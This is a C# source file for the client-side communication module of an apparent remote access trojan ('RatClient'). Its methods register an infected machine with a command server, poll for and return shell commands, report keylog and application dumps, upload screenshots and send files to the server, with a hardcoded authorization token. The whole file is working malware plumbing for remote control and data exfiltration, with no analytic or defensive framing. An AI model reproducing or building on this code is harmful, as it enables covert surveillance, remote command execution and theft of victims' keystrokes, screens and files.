using RestSharp;

using Newtonsoft.Json;

using Newtonsoft.Json.Linq;
using System;
using static System.Net.WebRequestMethods;
using System.Web;

namespace RatClient
{
    public class ResponseData
    {
        public string version { get; set; }
        public bool result { get; set; }
    }

    public class ResponseData2
    {
        public string version { get; set; }
        public string result { get; set; }
    }

    internal class Communicator
    {
        private string url = "http://localhost:8080/api/";
        private string authorization = "WWLh/ojwlsph8LxG+eThCA==";
        public Communicator()
        {

        }
        public bool IsRegistered(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IsRegistered";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IsConnected(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/isconnected";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IfUpdate(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfUpdate";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool SetForNoUpdate(string clientId) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForNoUpdate";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool SetForNoApplicationDump(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/SetForNoApplicationDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public string SelectOPEN() { return ""; }

        public string SelectDOWN() { return ""; }

        public bool AddUser(string clientId) { return true; }

   
        public bool Register(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/Register";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool RegisterValue(string clientId, string data, string value) {

            if(string.IsNullOrEmpty(value))
            {
                value = "empty";
            }
            try
            {
                var client = new RestClient();
      
                string baseURL = url + "Client/RegisterValue/"+clientId+"/"+data;
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                
                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");
               
                Value toSend = new Value() { value = value };

                request.AddBody(toSend);
         
                RestResponse response = client.ExecutePost(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }

        }
        public class Value
        {
            public string value { get; set; }
        }


        public bool IfInstalledAplicationDump(string clientId)
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfInstalledAplicationDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IfKeyLogDump(string clientId) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfKeyLogDump";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public bool IfCMDRun(string clientId) 
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfCMDRun";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
        public bool IfKeyScreenShare(string clientId) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "Client/IfScreenShare";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("clientId", clientId);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public class Screen
        {
            public string b { get; set; }
        }

        public bool SetMyScreen(byte[] bytes) {

            try
            {
                var stringToSend =  Convert.ToBase64String(bytes);
                Screen screen = new Screen() { b = stringToSend };

                var client = new RestClient();
                string baseURL = url + "ScreenShare/SetMyScreen";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");
                request.AddBody(screen);
                RestResponse response = client.ExecutePost(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }

        }

     
        public bool SendOutput(string output) {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/SendOutput";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddParameter("cmd", output);
                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public string ReadOutput()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/ReadOutput";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                if(test == "")
                {
                    return "";
                }
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData2>(response.Content);
                return deserializedObject.result.Substring(1, deserializedObject.result.Length-2);
            }
            catch
            {
                return "";
            }
        }

        public bool ClearCmd() {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/ClearCmd";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }

        public string ReadCmd()
        {
            try
            {
                var client = new RestClient();
                string baseURL = url + "CMDCommunication/ReadCmd";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);

                RestResponse response = client.Execute(request);
                var test = response.Content;
                if (test == "")
                    return test;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData2>(response.Content);
                return deserializedObject.result.Substring(1, deserializedObject.result.Length - 2); ;
            }
            catch
            {
                return "";
            }
        }

        public bool WriteFile(string fileName, byte[] file) {
            try
            {

                File fileToSend = new File()
                {
                     bytes = file,
                      fileName = fileName
                };
                var client = new RestClient();
                string baseURL = url + "File/SetFile";
                string apiURL = baseURL;
                client = new RestClient(apiURL);
                var request = new RestRequest();
                request.AddHeader("Authorization", authorization);
                request.AddHeader("Content-Type", "application/json; charset=utf-8");
                request.AddBody(fileToSend);
                RestResponse response = client.ExecutePost(request);
                var test = response.Content;
                var deserializedObject = JsonConvert.DeserializeObject<ResponseData>(response.Content);
                return deserializedObject.result;
            }
            catch
            {
                return false;
            }
        }
    }
    public class File
    {
        public string fileName { get; set; }
        public byte[] bytes { get; set; }
    }
}
